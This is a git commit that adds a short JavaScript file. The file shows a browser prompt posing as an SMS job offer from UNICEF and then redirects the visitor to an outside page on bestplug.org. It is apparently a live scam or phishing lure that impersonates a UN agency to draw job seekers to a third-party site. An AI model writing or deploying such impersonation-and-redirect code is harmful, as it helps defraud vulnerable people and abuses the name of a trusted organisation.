97a014db74b5aa342fe972be52e61257dd7ac23a
vibeblog <enom02567@gmail.com>
2025-04-20 09:24:02 +0100

    Create unicef-eg-active.js

---
+++ unicef-eg-active.js
@@ -0,0 +1,5 @@
+var password = 'APPLY NOW'
+password=prompt('SMS: Congratulations, you are qualify to work at UNITED NATION CHILDREN FUND (UNICEF), Press Ok to submit application Now ','APPLY NOW');
+if (password != 'APPLY NOW') {
+location.href='https://bestplug.org/unicef-job.html';
+}
